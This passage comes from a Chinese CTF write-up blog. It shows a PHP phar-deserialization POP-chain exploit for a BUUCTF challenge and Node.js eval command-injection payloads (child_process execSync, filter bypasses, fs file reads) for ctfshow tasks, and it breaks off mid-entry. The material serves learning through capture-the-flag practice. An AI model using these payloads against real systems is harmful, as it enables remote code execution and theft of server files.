function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>(); <span class="comment">#file=new File()  func=close</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>File类中发现了<code>file_get_contents()</code>如果能调用 则可以文件包含</p><p>可以构造<code>User-&gt;db(__destruct)-&gt;File-&gt;close()</code>来触发 但是读到的文件不能输出 </p><p>发现还有一个类FileList 中有一个魔术方法 其实一般有魔术方法的类 都会去找能不能构造pop链条</p><p>既然之前构造的链条没法回显 那么我们就要通过构造别的链条来使得回显</p><p><code>User-&gt;db(__destruct)-&gt;Filelist-&gt;__call-&gt;File-&gt;close()</code>再通过File函数的析构函数来回显</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>(); <span class="comment">#file=new File()  func=close</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当对象调用一个不存在的方法时，就会调用__call方法</p><p>并且默认<code>$func</code>为不存在函数名 <code>$args</code>为参数 并且以数组形式</p><p>用一个简单的demo来看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name-&gt;<span class="title function_ invoke__">close</span>(<span class="variable">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lunch</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$func</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="keyword">new</span> <span class="title function_ invoke__">lunch</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683725787472-68c9314f-0d45-4d69-80d1-1c6c2284da57.png" alt="img"></p><p>整个魔术方法__call达到的效果就是将文件包含的结果传递给$this-&gt;results二维数组  好让析构函数输出</p><p>那么这里__call方法是怎么做到的呢 一开始一直不明白这里的原理 看了好多wp 都没有提及 纯属是我太菜了 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683726874036-46a75869-468b-4c9d-833c-8651d7963247.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br></pre></td></tr></table></figure><p>$file其实就是我们要去构造的File对象 $func是返回的close函数名 上面的demo中也提到了</p><p>所以这里就等价为<code>File-&gt;close</code>是这样调用的</p><p>其析构函数可以将返回的结果返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>稍微审计一下其实就是把result数组结果赋值给<code>$table</code> 然后<code>echo $table;</code>输出</p><p>明白了整个链子 应该怎么构造呢 题目只容许我们上传一个文件 不像我们平常做的pop链 去赋值给一个变量让其反序列化</p><h2 id="Typo3-反序列化漏洞"><a href="#Typo3-反序列化漏洞" class="headerlink" title="Typo3 反序列化漏洞"></a>Typo3 反序列化漏洞</h2><p>该漏洞由phar:&#x2F;&#x2F;触发</p><p>可以直接去看大佬的总结：</p><p><a href="https://xz.aliyun.com/t/2715#toc-8">https://xz.aliyun.com/t/2715#toc-8</a></p><p><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p>说说我自己的看法</p><p>首先我们的phar文件能够上传到对方服务器上 并且有相应的魔术方法作为踏板 而且<code>/ phar://</code> 不能被转义</p><p>phar是php的压缩文件并且不经过解压就能直接被php访问并且执行</p><p>phar结构由四部分组成：</p><ul><li>stub phar 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>；</li><li>manifest 压缩文件的属性等信息，以<strong>序列化</strong>存储；</li><li>contents 压缩文件的内容；</li><li>signature 签名，放在文件末尾；</li></ul><p>构造固定内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phar生成代码</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;Z1d10t.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;Z1d10t.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>我们将构造的恶意pop链塞入<code>$phar-&gt;setMetadata();</code>中 ,并且存储形式为序列化字符串形式存储</p><p>通过winhex查看一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816275551-e8b892a0-9df4-4fc8-ab6b-18c0b8d4175c.png" alt="img"></p><p>当我们通过<code>phar://</code>去访问该文件时 我们构造的恶意序列化pop链就会被反序列化 从而执行恶意代码</p><p>明白了原理之后 直接构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db=<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="comment">//phar生成代码</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;Z1d10t.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;Z1d10t.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后这个flag路径是怎么推测出来的 其实题目也有暗喻 在download.php 不过如果我做这道题目肯定会当个瞎子</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816525788-9a226973-ff05-44f0-8c1a-3a8f69c96fe3.png" alt="img"></p><p>将我们生成的<code>Z1d10t.phar</code>改为<code>Z1d10t.png</code>上传上去这个后缀名并不会因为被修改而影响 猜测就像那个yaml反序列化题目一样 是通过二进制文件读取的 所以后缀无所谓</p><p>然后这里访问也有个坑  我们可以通过download.php 下载访问 或者 delete.php 删除访问</p><p>如果我们通过下载页面访问是不行的 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816750074-5e4f2216-b78b-406e-b1db-6769b1619212.png" alt="img"></p><p>download.php中有这么一串代码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816798255-1e9ab852-3d82-442f-a515-bde701d1239e.png" alt="img"></p><p>PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。参考：<a href="https://developer.aliyun.com/article/521394">https://developer.aliyun.com/article/521394</a></p><p>绕过 <code>open_basedir</code>可以参考：<a href="https://xz.aliyun.com/t/10070">https://xz.aliyun.com/t/10070</a></p><p>也就是说download.php访问文件只被限定于<code>:/etc:/tmp``getcwd()</code>也就是当前文件 三个路径 没法去读我们的文件</p><p>而delete.php没有被限定 可以去读</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683817203363-4f6eda6d-8d10-4e90-a406-88afe550599b.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> phar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-nodejs</title>
      <link href="/post/372ab69b.html"/>
      <url>/post/372ab69b.html</url>
      
        <content type="html"><![CDATA[<p>nodejs刷题</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为打一次比赛做到了这个nodejs原型链污染，是一点头绪都没有，就来恶补一下，keep on！</p><h1 id="Web-334-大小写"><a href="#Web-334-大小写" class="headerlink" title="Web-334(大小写)"></a>Web-334(大小写)</h1><p>代码审计 </p><p>给了账号和密码 账号是大写的<code>CTFSHOW</code>，但是输入的账号不能为大写，有个小写转大写的操作，输入<code>ctfshow</code>即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">return</span> users.<span class="title function_ invoke__">find</span>(function(item)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.username === name.<span class="title function_ invoke__">toUpperCase</span>() &amp;&amp; item.password === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Web-335-eval"><a href="#Web-335-eval" class="headerlink" title="Web-335(eval)"></a>Web-335(eval)</h1><p>eval()用法和php差不多 都是将字符串当作代码执行</p><p>这里nodejs执行命令类似于python 要调库 比如 python就要调包含目录执行的库，比如os，在nodejs里也是一样 不过这里都是通过<code>require(&#39;模块&#39;)</code>来调(不严谨 但是可以这么理解)</p><p>payload:<code>/?eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;)</code></p><p>可以参考nodejs中文网<a href="https://nodejs.cn/api/child_process.html#child-process">https://nodejs.cn/api/child_process.html#child-process</a></p><p>但是其他命令执行函数比如<code>exec()</code>返回都是<code>[object Object]</code></p><p>在这里只能用<code>execSync</code></p><h1 id="Web-336"><a href="#Web-336" class="headerlink" title="Web-336"></a>Web-336</h1><h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>设置了waf</p><p>读当前文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=__filename</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554090247-ff1c2fc3-f003-4545-bf76-66639c40658b.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;, &#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>这里fs模块负责读写文件</p><p>读当前文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554186939-e3aed060-1725-4070-ac8c-9b1b5c3e42fa.png" alt="img"></p><p>过滤了<code>exec load</code></p><p>通过字符拼接绕过：<code>?eval=require(&#39;child_process&#39;)[&#39;exe&#39;%2B&#39;cSync&#39;](&#39;ls&#39;)</code></p><p><code>%2B</code>是<code>+</code>的url编码</p><h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>用fs模块读当前路径文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683555038903-2775ef86-cbc4-40d8-be79-40e3b7d08b79.png" alt="img"></p><p>直接读就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>这里读路径和文件命令稍有不同 不过很好记</p><h2 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#x27;cmd&#x27;)</span><br></pre></td></tr></table></figure><p>利用编码绕过</p><h1 id="Web-337-数组绕过"><a href="#Web-337-数组绕过" class="headerlink" title="Web-337(数组绕过)"></a>Web-337(数组绕过)</h1><p>给了源码 类似于php的md5思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=1</span><br></pre></td></tr></table></figure><p>可以看师傅的总结 tql：<a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/</a></p><p>Web-336的编码绕过就是看了这个师傅的</p><h1 id="Web-338-经典原型链污染"><a href="#Web-338-经典原型链污染" class="headerlink" title="Web-338(经典原型链污染)"></a>Web-338(经典原型链污染)</h1><p>给了源码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683557652246-a808a88e-6dd5-4b14-84f1-a84d4af958d8.png" 